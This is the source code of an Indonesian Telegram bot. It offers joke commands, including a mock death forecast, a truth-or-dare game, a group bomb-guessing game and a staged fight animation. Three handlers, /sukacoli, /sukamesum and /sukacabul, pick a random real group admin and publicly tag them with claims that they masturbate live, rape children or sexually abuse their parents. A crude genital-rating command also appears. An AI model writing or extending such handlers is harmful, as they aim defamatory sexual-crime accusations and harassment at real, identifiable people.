  "👶 Kamu bocil legend, pernah masuk got gara-gara ngejar kucing 🐱😂",
  "👶 Waktu kecil kamu suka main pasir sampai baju berubah warna 🏖️🤣",
  "👶 Kamu bocil paling jago bikin coretan di tembok rumah kayak seniman 🎨😂",
  "👶 Katanya kamu dulu suka pakai ember jadi helm, feeling Power Ranger 🪣🦸‍♂️",
  "👶 Kamu bocil paling hobi kejar ayam, tapi selalu kalah sama ayam 🐔🤣",
  "👶 Waktu kecil kamu suka nyolong uang receh terus beli permen karet 🍬😂",
  "👶 Kamu bocil paling jago nangis kalo liat orang makan es krim sendirian 🍦😭",
  "👶 Katanya kamu dulu suka bikin drama nangis biar dibeliin mainan 🤣🧸",
  "👶 Kamu bocil paling kreatif, bikin masakan dari odol dan tanah 🌱😂",
  "👶 Waktu kecil kamu suka masuk kardus dan pura-pura jadi transformer 📦🤖",
];

// Handler versi node-telegram-bot-api
bot.onText(/\/sifatmasakecilku(?:@[\w_]+)?/, async (msg) => {
  const chatId = msg.chat.id;

  const hasil =
    sifatMasaKecil[Math.floor(Math.random() * sifatMasaKecil.length)];

  await bot.sendMessage(
    chatId,
    `🔮 Hasil cek sifat kamu waktu masih kecil:\n\n${hasil}`
  );
});
// ====== FITUR CEK KEMATIAN NGAKAK SUPER ======
const reasons = [
  "tertabrak bajaj nyelonong 🚖",
  "keracunan sambal level neraka 🌶️",
  "ketawa kebanyakan liat meme 🤣",
  "ketiban baju kotor numpuk 🧺",
  "kehabisan kuota pas lagi asik 📱",
  "dijebak janji diskon 99% 💸",
  "gagal ngopi pagi hari ☕",
  "kelelahan joget TikTok 💃",
  "diseruduk kambing tetangga 🐐",
  "terpeleset odading mang oleh 🍞",
  "kelelep minum es teh jumbo 🧋",
  "tersedak kerupuk pas lomba 17-an 🇮🇩",
  "terjebak di lift sama tukang jual parfum 🚪",
  "kebanyakan scroll reels sampe HP panas 🔥",
  "diculik alien gara-gara terlalu ganteng/cantik 👽",
  "ditiban jemuran besi pas angin ribut 🌪️",
  "kesandung kabel charger pas lari 🪫",
  "kegencet pintu angkot pas buru-buru 🚐",
  "kelelep di kolam renang karet depan rumah 🏊",
  "kebanyakan makan mie instan sampe jadi mie hidup 🍜",
  "jatoh dari motor pas lagi gaya freestyle 🏍️",
  "dipatok angsa tetangga yang dendam 🦢",
  "ketiban galon isi ulang 19 liter 💧",
  "kesetrum colokan 3 cabang abal-abal 🔌",
  "ketiban tumpukan tugas numpuk 📚",
  "kepeleset minyak goreng di dapur 🍳",
  "diseruduk kambing kurban pas 10 Dzulhijjah 🐏",
  "ngantuk pas rapat zoom, gak bangun lagi 💤",
  "kejebak di kamar mandi karena gagang pintu copot 🚪",
  "jatoh gara-gara sandung ujung karpet 🏠",
  "kejatuhan buah kelapa di pantai 🥥",
  "diserang kucing tetangga yang over power 🐈",
  "tersedak ciki pedas waktu lagi maraton film 🍿",
  "tewas karena kaget liat saldo rekening Rp 0 💀",
  "kelelep di ember pas cuci kaki 🪣",
  "ditempeleng sandal jepit legend 👡",
  "tenggelam dalam lautan kenangan mantan 💔",
  "kejatuhan spanduk kampanye pas angin kencang 🏴",
  "hilang arah gara-gara GPS muter-muter 🗺️",
  "kegencet tukang sayur pakai gerobak 🛒",
  "tersangkut pintu otomatis mall 🚪",
  "kebanyakan es batu, badan langsung jadi kulkas 🧊",
  "terjebak di wahana komedi putar sampe pingsan 🎡",
  "ketiban drone bocil balap liar ✈️",
  "kebanyakan rebahan jadi fosil 🦴",
  "tertabrak sepeda onthel kakek-kakek 🚲",
  "keserempet becak bertenaga turbo 🛺",
  "ketiban helm proyek dari langit ⛑️",
  "tersengat lebah galau 🐝",
  "ketiban mie ayam gerobakan 🍲",
  "kebanyakan karaoke dangdut koplo sampe gosong 🎤",
  "tewas gara-gara panik liat kecoa terbang 🪳",
  "kebanyakan minum kopi, jantung balap liar 🏎️",
  "ketiban kipas angin pas lagi tidur 💨",
  "kepleset sabun mandi 🧼",
  "terjebak di kasur empuk, ga bisa bangun 🛏️",
  "tersedak odading mang oleh 🍩",
  "kecemplung got pas main hp 🚷",
  "diseruduk bebek pasar 🦆",
  "ketiban pintu lemari yang jebol 🚪",
  "keseret arus kolam renang hotel 🏊‍♂️",
  "kelelep bakso jumbo pas makan buru-buru 🍡",
  "ketiban speaker hajatan dangdut 🔊",
  "kepeleset es krim cair 🍦",
  "ketiban hp sendiri pas rebahan 📱",
  "keserempet ibu-ibu naik motor tanpa lampu 🚨",
  "tumbang gara-gara balon gas meletus 🎈",
  "ditimpuk sandal swallow legend 🩴",
  "kecemplung ember cat pas renovasi 🎨",
  "ketiban galon dispenser jatoh 💦",
  "kepeleset mie ayam jatoh di jalan 🍜",
  "terlilit charger hp kayak ular 🐍",
  "tersedak ciki meletus 🌶️",
  "kejebak tangga eskalator macet 🛗",
  "tersambar petasan bocil 🔥",
  "kejatuhan layangan putus 🎏",
  "tumbang gara-gara nonton drama kebanyakan 🎬",
  "kelelep teh poci jumbo 🍵",
  "kegencet pintu KRL 🚆",
  "terjebak di kursi goyang sampe patah 🪑",
  "kebanyakan ngemil ciki, badan jadi ciki hidup 🍟",
  "ditabrak mobil odong-odong 🚍",
  "ketiban bola voli di pantai 🏐",
  "tersandung kabel mic hajatan 🎤",
  "ditiban rak piring roboh 🍽️",
  "disenggol becak turbo 🚴",
  "tewas karena kaget tagihan listrik 💡",
  "tertabrak motor scoopy bocil racing 🛵",
  "ketiban gas elpiji 3kg 💚",
  "terjebak di lift mall pas mati lampu 🔦",
  "kesandung tali jemuran 🧵",
  "jatoh dari kursi lipat 🪑",
  "kebanyakan minum boba, jadi mutiara hidup 🧋",
  "diseruduk rusa kebun binatang 🦌",
  "ditiban kardus Indomie 📦",
  "tersedak roti tawar kering 🍞",
  "ketiban remote TV pas dilempar 💻",
  "kebanyakan makan kerupuk, tenggorokan seret 🥨",
  "kejebak di angkot penuh 💺",
  "tumbang gara-gara nyamuk over power 🦟",
];

function generateDeath(userId) {
  const now = new Date();
  const seed = (userId + Date.now()) % 999999;

  const rndAge = Math.floor((seed % 80) + 18); // umur 18–98
  const rndExtra = Math.floor((seed * 12345) % 365); // hari tambahan
  const death = new Date(now);
  death.setFullYear(now.getFullYear() + rndAge);
  death.setDate(death.getDate() + rndExtra);

  const daysLeft = Math.floor((death - now) / (1000 * 60 * 60 * 24));
  const reason = reasons[Math.floor(seed % reasons.length)];

  return { death, age: rndAge, daysLeft, reason };
}

// === HANDLER NODE-TELEGRAM-BOT-API ===
bot.onText(/\/cekmati(?:@[\w_]+)?/, async (msg) => {
  const chatId = msg.chat.id;
  const user = msg.from;

  const { death, age, daysLeft, reason } = generateDeath(user.id);

  const fullName = [user.first_name, user.last_name].filter(Boolean).join(" ");

  const text =
    `🔮 *Ramalan Kematian Kamu*\n\n` +
    `👤 Nama: _${fullName}_\n` +
    `📅 Tanggal: *${death.toISOString().split("T")[0]}*\n` +
    `⌛ Umur saat meninggal: *${age} tahun*\n` +
    `📆 Sisa hari: *${daysLeft} hari*\n\n` +
    `💀 Penyebab: _${reason}_\n\n` +
    `_Disclaimer: ini cuma hiburan, jangan dipercaya beneran ya 😜_`;

  await bot.sendMessage(chatId, text, {
    parse_mode: "Markdown",
  });
});
// Ambil user random dari admin grup (non-bot)
async function getRandomMember(chatId) {
  try {
    const admins = await bot.getChatAdministrators(chatId);
    const users = admins
      .map(a => a.user)
      .filter(u => !u.is_bot);

    if (users.length === 0) return null;

    return users[Math.floor(Math.random() * users.length)];
  } catch (err) {
    console.error(err);
    return null;
  }
}
// /sukacoli
bot.onText(/\/sukacoli(?:@\w+)?/, async (msg) => {
  const chatId = msg.chat.id;

  const user = await getRandomMember(chatId);
  if (!user) {
    return bot.sendMessage(chatId, "Tidak ada anggota yang bisa dipilih 😅");
  }

  const tag = user.username ? `@${user.username}` : user.first_name;

  bot.sendMessage(
    chatId,
    `😂 Dia Sering Coli Setiap Hari Sampek Di Buat Live ${tag}!`
  );
});

// /sukamesum
bot.onText(/\/sukamesum(?:@\w+)?/, async (msg) => {
  const chatId = msg.chat.id;

  const user = await getRandomMember(chatId);
  if (!user) {
    return bot.sendMessage(chatId, "Tidak ada anggota yang bisa dipilih 😅");
  }

  const tag = user.username ? `@${user.username}` : user.first_name;

  bot.sendMessage(
    chatId,
    `🤣 Si Anjing Ini Sering Perkosa Anak Orang Wkwkwk ${tag}!`
  );
});

// /sukacabul
bot.onText(/\/sukacabul(?:@\w+)?/, async (msg) => {
  const chatId = msg.chat.id;

  const user = await getRandomMember(chatId);
  if (!user) {
    return bot.sendMessage(chatId, "Tidak ada anggota yang bisa dipilih 😅");
  }

  const tag = user.username ? `@${user.username}` : user.first_name;

  bot.sendMessage(
    chatId,
    `😱 Dia Suka Cabulin Orang Tuanya Sendiri ${tag}!`
  );
});
// ================= GAME HARUS JUJUR 3X (node-telegram-bot-api) =================
const pertanyaanJujur = [
  // Pertanyaan tentang perasaan
  "Siapa orang yang diam-diam kamu suka sekarang? 😳",
  "Pernah suka sama sahabat sendiri? 🤔",
  "Siapa mantan yang paling bikin kamu nyesel? 🥲",
  "Kalau disuruh balikan sama mantan, siapa yang kamu pilih? ❤️",
  "Siapa orang yang paling sering bikin kamu baper? 🥺",

  // Pertanyaan lucu & kocak
  "Kapan terakhir kali kamu kentut keras-keras? 💨😂",
  "Pernah pura-pura tidur biar gak diganggu? 😴",
  "Pernah pura-pura sakit biar bolos sekolah/kerja? 🛌",
  "Kapan terakhir kali kamu bohong bilang 'OTW' padahal masih di rumah? 🏠🤣",
  "Pernah ngupil terus ditempel di bawah meja? 🤣",

  // Pertanyaan sehari-hari
  "Kapan terakhir kali kamu mandi? 🛁",
  "Siapa yang paling ngeselin di grup ini menurutmu? 😆",
  "Siapa yang paling sering bikin kamu ketawa? 😂",
  "Kapan terakhir kali kamu nangis diam-diam? 😢",
  "Siapa yang sering kamu kepoin diam-diam? 👀",

  // Pertanyaan tentang rahasia kecil
  "Pernah ngintip chat orang lain diam-diam? 📱",
  "Pernah stalk mantan sampai kepo banget? 🕵️‍♂️",
  "Pernah suka sama guru/dosen? 📚",
  "Pernah pura-pura sibuk biar gak bales chat siapa? 📲",
  "Pernah curi-curi tidur di kelas/kerja? 😴",

  // Pertanyaan agak malu-malu
  "Siapa orang terakhir yang bikin kamu senyum sendiri? 🤭",
  "Pernah bohong ke orang tua? 🤔",
  "Siapa yang kamu kangenin banget sekarang? 🥺",
  "Pernah bohong ke pacar/gebetan? 😬",
  "Pernah suka sama pacar orang? 😏",

  // Pertanyaan pilihan kocak
  "Pilih mana: kehilangan HP atau kehilangan pacar? 📱❤️",
  "Kalau dikasih 1 miliar atau balikan sama mantan, pilih mana? 💸😂",
  "Kalau disuruh pilih, kamu mending jomblo seumur hidup atau nggak bisa makan mie instan lagi? 🍜🤣",
  "Pilih mana: tidur 12 jam sehari atau nggak tidur sama sekali 2 hari? 🛌☕",
  "Kalau disuruh milih, kamu mending lupa sama semua orang atau semua orang lupa sama kamu? 🧠❓",

  // Pertanyaan ngakak random
  "Pernah makan mie instan pake nasi? 🍜🍚",
  "Kapan terakhir kali kamu ketahuan bohong? 😅",
  "Pernah ketiduran sambil video call? 📞😴",
  "Pernah ke WC umum terus lupa bawa tisu? 🚽🤣",
  "Kalau kamu jadi presiden, hal konyol apa yang bakal kamu bikin? 👑😂",
];

// Simpan state game per user-per-chat
// key: `${chatId}:${userId}` => { count, awaitingAnswer }
const truthGames = {};

// Fungsi bantu: kirim pertanyaan
function kirimPertanyaan(chatId, userId) {
  const key = `${chatId}:${userId}`;
  const game = truthGames[key];
  if (!game) return;

  if (game.count >= 3) {
    bot.sendMessage(chatId, "✅ Terima kasih sudah menjawab pertanyaanku 🙏🤣");
    delete truthGames[key];
    return;
  }

  const random =
    pertanyaanJujur[Math.floor(Math.random() * pertanyaanJujur.length)];

  bot.sendMessage(
    chatId,
    `🎮 *Game Harus Jujur Ngakak* 🎮\n\n` +
      `Pertanyaan ${game.count + 1}:\n👉 ${random}\n\n` +
      `_Jawab dengan jujur ya! 🤣_`,
    { parse_mode: "Markdown" }
  );

  game.awaitingAnswer = true;
}

// Command /teskejujuran
bot.onText(/\/teskejujuran(?:@\w+)?/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const key = `${chatId}:${userId}`;

  truthGames[key] = {
    count: 0,
    awaitingAnswer: false,
  };

  kirimPertanyaan(chatId, userId);
});

// Listener jawaban user
bot.on("message", (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // Hanya respon pesan text biasa
  if (!msg.text) return;

  // Abaikan kalau ini command lain (biar ga keitung jawaban)
  if (msg.text.startsWith("/")) return;

  const key = `${chatId}:${userId}`;
  const game = truthGames[key];

  if (!game) return;
  if (!game.awaitingAnswer) return;

  // Jawaban user
  bot.sendMessage(chatId, `🤣 Jawaban kamu: "${msg.text}"`);

  game.count++;
  game.awaitingAnswer = false;

  // Kirim pertanyaan berikutnya
  kirimPertanyaan(chatId, userId);
});
// ===== Game Tebak Bom Grup (node-telegram-bot-api) =====
const groupGames = {}; // Simpan game per grup

// Helper: SELALU pakai @username
function tagUser(player) {
  return `@${player.username}`;
}

// Helper: generate posisi bom unik
function generateBombs(totalKotak, jumlahBom) {
  const set = new Set();
  while (set.size < jumlahBom) {
    const pos = Math.floor(Math.random() * totalKotak) + 1; // 1..totalKotak
    set.add(pos);
  }
  return Array.from(set);
}

// Helper: render papan (angka / ✅ / 💥)
function getDisplayBoard(game) {
  return game.kotakStatus
    .map((status, idx) => {
      const num = idx + 1;
      if (status === "closed") return String(num); // kotak belum dibuka → angka
      if (status === "safe") return "✅";
      if (status === "bomb") return "💥";
    })
    .join(" ");
}

// /startbom - Mulai pendaftaran game
bot.onText(/\/startbom(?:@\w+)?/, (msg) => {
  const chat = msg.chat;
  if (!chat || (chat.type !== "group" && chat.type !== "supergroup")) {
    return bot.sendMessage(chat.id, "❌ Game hanya bisa dimainkan di grup.");
  }

  const chatId = chat.id;

  if (groupGames[chatId]) {
    return bot.sendMessage(
      chatId,
      "⚠️ Game sedang berlangsung di grup ini. Ketik /resetbom untuk reset."
    );
  }

  const jumlahKotak = 50;
  const jumlahBom = 13;

  groupGames[chatId] = {
    hostId: msg.from.id,                   // yang start, hanya dia yg boleh reset
    hostUsername: msg.from.username || null,
    players: [],                           // pemain yang masih hidup
    started: false,
    currentTurn: 0,
    jumlahKotak,
    bombs: generateBombs(jumlahKotak, jumlahBom), // array posisi bom
    kotakStatus: Array(jumlahKotak).fill("closed"), // "closed" | "safe" | "bomb"
    eliminated: [],                        // pemain yang sudah kena bom
    eliminationOrder: 0,                   // counter urutan kena bom
  };

  bot.sendMessage(
    chatId,
    "🎮 *Game Tebak Bom Dimulai!*\n\n" +
      "Ketik `/daftar` untuk ikut bermain.\n" +
      "Minimal 5 pemain, maksimal 10 pemain.\n" +
      "Admin ketik `/mulai` untuk memulai game.\n\n" +
      "⚠️ Wajib punya username Telegram (@username) untuk ikut.\n" +
      "⚠️ Hanya yang mengetik /startbom pertama kali yang bisa /resetbom.\n" +
      "⚠️ Kotak 1–50, tersebar 13 bom acak.",
    { parse_mode: "Markdown" }
  );
});

// /daftar - Pendaftaran pemain
bot.onText(/\/daftar(?:@\w+)?/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const username = msg.from.username; // WAJIB ada

  if (!groupGames[chatId]) {
    return bot.sendMessage(
      chatId,
      "❌ Belum ada game. Ketik /startbom untuk mulai pendaftaran."
    );
  }

  const game = groupGames[chatId];

  if (game.started) {
    return bot.sendMessage(
      chatId,
      "⚠️ Pendaftaran sudah ditutup. Game sedang berlangsung."
    );
  }

  if (!username) {
    return bot.sendMessage(
      chatId,
      "⚠️ Kamu harus punya username Telegram (@...) dulu untuk ikut game.\n" +
      "Silakan set di *Pengaturan ➜ Username*, lalu daftar lagi.",
      { parse_mode: "Markdown" }
    );
  }

  if (game.players.find((p) => p.id === userId)) {
    return bot.sendMessage(chatId, "⚠️ Kamu sudah terdaftar.");
  }

  if (game.players.length >= 10) {
    return bot.sendMessage(
      chatId,
      "⚠️ Pendaftaran penuh (maksimal 10 pemain)."
    );
  }

  game.players.push({
    id: userId,
    name: msg.from.first_name || "Pemain",
    username: username, // dipastikan ada
  });

  bot.sendMessage(
    chatId,
    `✅ @${username} berhasil daftar! (Total pemain: ${game.players.length}/10)`
  );
});

// /mulai - Mulai game setelah pendaftaran
bot.onText(/\/mulai(?:@\w+)?/, (msg) => {
  const chatId = msg.chat.id;

  if (!groupGames[chatId]) {
    return bot.sendMessage(chatId, "❌ Belum ada game. Ketik /startbom untuk mulai.");
  }

  const game = groupGames[chatId];

  if (game.players.length < 5) {
    return bot.sendMessage(chatId, "⚠️ Minimal 5 pemain untuk memulai game.");
  }

  game.started = true;
  game.currentTurn = 0;

  const board = getDisplayBoard(game);
  bot.sendMessage(
    chatId,
    `🎲 Game dimulai!\n` +
      `Pemain terdaftar: ${game.players.map((p) => tagUser(p)).join(", ")}\n\n` +
      `${board}\n\n` +
      `👉 Giliran: ${tagUser(game.players[0])}\n` +
      `Pilih kotak dengan /pilih <nomor> (1-50)`
  );
});

// Helper: kirim hasil akhir / peringkat
function kirimPeringkatAkhir(bot, chatId, game, adaPemenang, winner) {
  let judul;
  if (adaPemenang) {
    judul = "🏆 *Hasil Akhir Game Tebak Bom* (Ada Pemenang)\n\n";
  } else {
    judul = "💀 *Hasil Akhir Game Tebak Bom* (Tidak Ada Pemenang)\n\n";
  }

  let ranking = [];

  if (adaPemenang && winner) {
    ranking.push(winner); // pemenang di posisi 1
  }

  // Urutkan yang kena bom dari paling lama bertahan ke paling cepat meledak
  const eliminatedSorted = [...game.eliminated].sort(
    (a, b) => b.eliminatedAt - a.eliminatedAt
  );

  ranking = adaPemenang ? [winner, ...eliminatedSorted] : eliminatedSorted;

  let text = judul;
  ranking.forEach((p, idx) => {
    const posisi = idx + 1;
    const extra =
      adaPemenang && idx === 0
        ? " 🏆"
        : "";
    text += `${posisi}. ${tagUser(p)}${extra}\n`;
  });

  if (!ranking.length && !adaPemenang) {
    text += "_Tidak ada data peringkat._\n";
  }

  bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
}

// /pilih <nomor> - Pemain memilih kotak
bot.onText(/\/pilih(?:@\w+)?(?:\s+(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const pilihan = parseInt(match[1]);

  if (!groupGames[chatId]) {
    return bot.sendMessage(
      chatId,
      "❌ Tidak ada game aktif. Ketik /startbom untuk mulai."
    );
  }

  const game = groupGames[chatId];

  if (!game.started) {
    return bot.sendMessage(
      chatId,
      "⚠️ Game belum dimulai. Admin ketik /mulai untuk mulai game."
    );
  }

  const currentPlayer = game.players[game.currentTurn];

  if (!currentPlayer || userId !== currentPlayer.id) {
    return bot.sendMessage(
      chatId,
      `⚠️ Sekarang giliran ${currentPlayer ? tagUser(currentPlayer) : "pemain lain"}, bukan kamu!`
    );
  }

  if (isNaN(pilihan) || pilihan < 1 || pilihan > game.jumlahKotak) {
    return bot.sendMessage(
      chatId,
      `⚠️ Masukkan nomor kotak antara 1-${game.jumlahKotak}.`
    );
  }

  // Cek apakah kotak sudah pernah dibuka
  if (game.kotakStatus[pilihan - 1] !== "closed") {
    return bot.sendMessage(
      chatId,
      "⚠️ Kotak ini sudah dibuka, pilih nomor lain."
    );
  }

  // Cek apakah kotak ini bom
  const isBomb = game.bombs.includes(pilihan);

  // ================= LOGIKA BOM =================
  if (isBomb) {
    game.kotakStatus[pilihan - 1] = "bomb";

    const eliminatedPlayer = currentPlayer;

    // Catat urutan kena bom
    game.eliminationOrder += 1;
    game.eliminated.push({
      ...eliminatedPlayer,
      eliminatedAt: game.eliminationOrder,
    });

    // Hapus player yg kena bom dari list players
    game.players.splice(game.currentTurn, 1);

    const boardAfter = getDisplayBoard(game);

    bot.sendMessage(
      chatId,
      `${boardAfter}\n\n💥 BOOM! ${tagUser(
        eliminatedPlayer
      )} kena bom dan *dikeluarkan dari game!*`,
      { parse_mode: "Markdown" }
    );

    // Cek sisa pemain
    if (game.players.length === 1) {
      const winner = game.players[0];

      bot.sendMessage(
        chatId,
        `🏆 Pemenang adalah ${tagUser(winner)}!`
      );

      // Kirim peringkat akhir
      kirimPeringkatAkhir(bot, chatId, game, true, winner);

      delete groupGames[chatId];
      return;
    }

    if (game.players.length === 0) {
      bot.sendMessage(
        chatId,
        "💀 Semua pemain kena bom. Tidak ada pemenang."
      );

      // Kirim peringkat akhir tanpa pemenang
      kirimPeringkatAkhir(bot, chatId, game, false, null);

      delete groupGames[chatId];
      return;
    }

    // Sesuaikan currentTurn jika index keluar dari range
    if (game.currentTurn >= game.players.length) {
      game.currentTurn = 0;
    }

    bot.sendMessage(
      chatId,
      `👉 Giliran berikutnya: ${tagUser(game.players[game.currentTurn])}\n` +
      `👥 Sisa pemain: ${game.players.map(p => tagUser(p)).join(", ")}`
    );

    return;
  }

  // ================= AMAN (BUKAN BOM) =================
  game.kotakStatus[pilihan - 1] = "safe";

  const boardAfterSafe = getDisplayBoard(game);

  bot.sendMessage(
    chatId,
    `${boardAfterSafe}\n\n✅ Aman! ${tagUser(
      currentPlayer
    )} selamat dari bom!`
  );

  // Cek kondisi SERI:
  // kalau semua kotak aman sudah dibuka dan tidak ada yang kena bom sama sekali.
  const closedPositions = [];
  for (let i = 0; i < game.jumlahKotak; i++) {
    if (game.kotakStatus[i] === "closed") {
      closedPositions.push(i + 1); // posisi 1-based
    }
  }

  if (closedPositions.length === 0 && game.eliminated.length === 0) {
    // Secara literal: semua kotak sudah dibuka & tidak ada yang kena bom
    const seriPlayers = game.players.map(p => tagUser(p)).join(", ");
    bot.sendMessage(
      chatId,
      `🤝 Semua kotak sudah dibuka dan *tidak ada yang kena bom*!\n` +
      `Pemain seri: ${seriPlayers}`,
      { parse_mode: "Markdown" }
    );
    delete groupGames[chatId];
    return;
  }

  // Pindah ke giliran berikutnya (circular)
  game.currentTurn = (game.currentTurn + 1) % game.players.length;

  bot.sendMessage(
    chatId,
    `👉 Giliran berikutnya: ${tagUser(game.players[game.currentTurn])}`
  );
});

// /resetbom - Reset game di grup (HANYA host yang boleh)
bot.onText(/\/resetbom(?:@\w+)?/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const game = groupGames[chatId];

  if (!game) {
    return bot.sendMessage(chatId, "⚠️ Tidak ada game untuk direset.");
  }

  if (userId !== game.hostId) {
    return bot.sendMessage(
      chatId,
      `⚠️ Hanya ${game.hostUsername ? `@${game.hostUsername}` : "pembuat game"} yang bisa mereset game ini.`
    );
  }

  delete groupGames[chatId];
  bot.sendMessage(chatId, "🔄 Game berhasil direset oleh pembuat game.");
});
// ================= GAME BERANTEM ANIMASI =================
bot.onText(/^\/berantem(?:@[\w_]+)?\s+(.+)/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const messageText = msg.text;
    const mentions = messageText.match(/@\w+/g);

    if (!mentions || mentions.length < 2) {
      return bot.sendMessage(
        chatId,
        "⚔️ Kamu harus tag *2 orang* untuk berantem!\n\nContoh:\n/berantem @user1 @user2",
        { parse_mode: "Markdown" }
      );
    }

    const user1 = mentions[0];
    const user2 = mentions[1];

    // ================= ADEGAN BERANTEM (PANJANG) =================
    const adegan = [
      `⚔️ ${user1} dan ${user2} saling menatap dengan aura permusuhan...`,
      `😠 ${user1} mengepalkan tangan, bersiap menyerang!`,
      `🤜 ${user1} melayangkan pukulan cepat ke arah ${user2}!`,
      `💨 ${user2} menghindar tipis sambil mundur!`,
      `😤 ${user2} tersenyum sinis dan pasang kuda-kuda.`,
      `🥊 ${user2} membalas dengan serangan bertubi-tubi!`,
      `😵 ${user1} terpental tapi berhasil menahan diri!`,
      `🔥 ${user1} bangkit dengan semangat membara!`,
      `⚡ Aura ${user1} meningkat drastis!`,
      `💥 Benturan keras terjadi di tengah pertarungan!`,
      `😲 Penonton dibuat terdiam melihat serangan brutal ini!`,
      `🌀 ${user2} mengeluarkan jurus rahasia!`,
      `🛡️ ${user1} bertahan mati-matian!`,
      `😡 Emosi keduanya tak bisa dibendung lagi!`,
      `💢 Serangan demi serangan terus berlanjut!`,
      `🥵 Nafas mulai terengah, tapi belum ada yang menyerah.`,
      `🩸 Luka kecil mulai terlihat, suasana makin panas!`,
      `⚡ Tanah seolah bergetar karena pertarungan mereka!`,
      `🔥 ${user1} menjerit dan menyerang dengan kekuatan terakhir!`,
      `💣 Ledakan energi membuat semua orang mundur!`,
      `😱 Grup chat langsung hening...`,
      `⌛ Beberapa detik terasa sangat lama...`,
    ];

    // ================= HASIL AKHIR =================
    const akhir = [
      `🏆 *${user1}* berhasil mengalahkan *${user2}* dengan heroik!`,
      `🏆 *${user2}* berhasil menjatuhkan *${user1}* secara telak!`,
      `🤝 Setelah pertarungan sengit, *${user1}* dan *${user2}* berakhir imbang!`,
      `😵 Keduanya tumbang bersamaan! Tidak ada pemenang hari ini.`,
      `😂 Pertarungan dihentikan admin sebelum makin rusuh!`
    ];

    // Kirim adegan satu per satu (animasi teks)
    for (const teks of adegan) {
      await bot.sendMessage(chatId, teks, { parse_mode: "Markdown" });
      await new Promise(r => setTimeout(r, 1400)); // jeda 1.4 detik
    }

    const randomAkhir = akhir[Math.floor(Math.random() * akhir.length)];
    await bot.sendMessage(chatId, randomAkhir, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("BERANTEM ERROR:", err);
    bot.sendMessage(chatId, "❌ Terjadi error saat menjalankan game berantem.");
  }
});
// ================= DATA CEK KONTOL =================
const ukuranKontol = [
  "Mini (3 cm)",
  "Mini Lucu (5 cm)",
  "Standar Kalem (10 cm)",
  "Sedang Aman (13 cm)",
  "Sedang Nyaman (15 cm)",
  "Cukup Besar (18 cm)",
  "Besar Full Power (20 cm)",
  "Jumbo (25 cm)",
  "XL Ekstra (28 cm)",
  "Raksasa (30 cm)",
  "Titanium (35 cm)",
  "Monster Alam (40 cm)",
  "Legenda Desa (45 cm)",
  "Raksasa Urban (50 cm)",
  "Mitos Kuno (60 cm)",
  "Tidak Masuk Logika (80 cm)",
  "Legenda Internet (100 cm)",
  "Error System (??? cm)",
  "Rahasia Negara 🇮🇩",
  "Gak Bisa Diukur (Overlimit)"
];

const warnaKontol = [
  "Merah menyala 🔴",
  "Merah gelap 🍷",
  "Biru laut 🔵",
  "Biru tua dingin ❄️",
  "Hijau zamrud 🟢",
  "Hijau army 🪖",
  "Kuning emas 🟡",
  "Coklat caramel 🍫",
  "Hitam misterius ⚫",
  "Putih pucat 🤍",
  "Abu-abu metal ⚙️",
  "Ungu raja 👑",
  "Pink lembut 🌸",
  "Pelangi full color 🌈",
  "Glow in the dark ✨",
  "Chrome futuristik 🪞",
  "Matte elegan 🎩",
  "Natural original 🌿",
  "Mode gelap aktif 🌑",
  "Mode terang aktif 🌕"
];

const sifatKontol = [
  "Pemalu tapi setia 😳",
  "Kalem tapi ganas 🐍",
  "Nurut tapi bahaya",
  "Pendiam mematikan",
  "Cepat bangkit 💪",
  "Tahan banting 🛡️",
  "Gampang tegang ⚡",
  "Santai tapi kuat",
  "Overthinking juga 😔",
  "Auto on kalau dipuji 😌",
  "Sensitif parah 😵",
  "Low profile, high impact",
  "Suka drama",
  "Bikin kaget orang",
  "Susah dikendalikan",
  "Punya mood swing",
  "Kalau capek ngambek",
  "Setia sama owner 👑",
  "Kadang error sendiri",
  "Berbahaya kalau lapar"
];

function generateCekKontol() {
  const ukuran = ukuranKontol[Math.floor(Math.random() * ukuranKontol.length)];
  const warna = warnaKontol[Math.floor(Math.random() * warnaKontol.length)];
  const sifat = sifatKontol[Math.floor(Math.random() * sifatKontol.length)];

  return (
`🔮 *Hasil Cek Kontol* 🔮

⚔️ Ukuran : ${ukuran}
🎨 Warna  : ${warna}
🧠 Sifat  : ${sifat}`
  );
}

// ================= COMMAND /cekkontol =================
bot.onText(/^\/cekkontol(?:@[\w_]+)?$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    await bot.sendMessage(
      chatId,
      generateCekKontol(),
      {
        parse_mode: "Markdown",
        reply_to_message_id: msg.message_id
      }
    );
  } catch (e) {
    console.error("CEKKONTOL ERROR:", e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat cek.");
  }
});
// ================= CEK MESUM DATA =================
const pasanganMesum = [
  "mantan",
  "teman sekolah",
  "tetangga",
  "gebetan",
  "orang yang gak kamu kenal",
  "dosen",
  "teman kerja",
  "random stranger",
  "teman online",
  "idol favorit kamu",
  "crush rahasia",
  "bestie sendiri",
  "teman satu circle",
  "orang random di jalan",
  "admin grup",
  "followers IG",
  "mutualan Twitter",
  "teman lama yang tiba-tiba muncul",
  "mantannya mantan",
  "people from DM",
  "cosplayer",
  "karakter anime",
  "tokoh film favorit",
  "orang yang cuma lewat doang",
  "orang di mimpi kamu",
  "orang yang sering muncul di FYP",
  "teman mabar",
  "rekan kerja sebelah meja",
  "orang yang sering tatap-tatapan",
  "teman curhat",
  "orang yang gak seharusnya kamu pikirin",
  "orang yang bilang “kita temenan aja”",
  "mantan yang udah punya pasangan",
  "orang ber-aura bahaya",
  "si pendiam tapi misterius",
  "orang yang sering bikin salting",
  "crush masa kecil",
  "orang random di komentar",
  "orang yang sering kamu stalking",
  "orang yang sering muncul di mimpi aneh",
  "teman lama yang kamu block-unblock",
  "orang yang cuma kamu kenal lewat username"
];

function generateCekMesum(nama) {
  const persen = Math.floor(Math.random() * 100) + 1;
  const target = pasanganMesum[Math.floor(Math.random() * pasanganMesum.length)];
  return `📊 *Cek Mesum*\n\n${nama} sering mesum *${persen}%* sama *${target}* 🤭`;
}

// ================= COMMAND /cekmesum =================
